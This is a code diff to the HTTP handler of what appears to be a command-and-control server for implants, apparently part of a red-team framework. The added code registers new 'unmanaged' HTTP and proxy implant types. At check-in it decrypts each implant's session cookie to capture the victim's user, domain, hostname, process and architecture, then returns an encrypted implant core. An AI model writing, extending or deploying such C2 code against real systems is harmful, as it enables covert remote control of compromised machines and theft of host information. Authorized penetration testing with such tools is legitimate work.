@@ -121,6 +121,10 @@ class MyHandler(BaseHTTPRequestHandler):
             # register new implant
             elif new_implant_url in self.path and self.cookieHeader.startswith("SessionID"):
                 implant_type = ImplantType.PowerShellHttp
+                if self.path == f"{new_implant_url}?n":
+                    implant_type = ImplantType.UnmanagedHttp
+                if self.path == f"{new_implant_url}?p?n":
+                    implant_type = ImplantType.UnmanagedHttpProxy
                 if self.path == f"{new_implant_url}?p":
                     implant_type = ImplantType.PowerShellHttpProxy
                 if self.path == f"{new_implant_url}?d":
@@ -202,6 +206,18 @@ class MyHandler(BaseHTTPRequestHandler):
                                                                 url_id)
                     display(new_linux_implant)
                     response_content = encrypt(base_encryption_key, new_implant.linux_core)
+
+                elif implant_type.is_unmanaged_implant():
+                    encrypted_session_cookie = self.cookieHeader.replace("SessionID=", "")
+                    decrypted_session_cookie = decrypt(base_encryption_key, encrypted_session_cookie)
+                    ip_address = f"{self.client_address[0]}:{self.client_address[1]}"
+                    user, domain, hostname, process_name, architecture, process_id, url_id = decrypted_session_cookie.split(";")
+                    url_id = url_id.replace("\x00", "")
+                    new_unmanaged_implant, unmanaged_core = new_implant(ip_address, implant_type, str(domain), str(user),
+                                                                        str(hostname), architecture, process_id,
+                                                                        str(process_name).lower().replace(".exe", ""), url_id)
+                    display(new_unmanaged_implant)
+                    response_content = encrypt(base_encryption_key, unmanaged_core)
 
                 elif implant_type.is_powershell_implant():
                     encrypted_session_cookie = self.cookieHeader.replace("SessionID=", "")
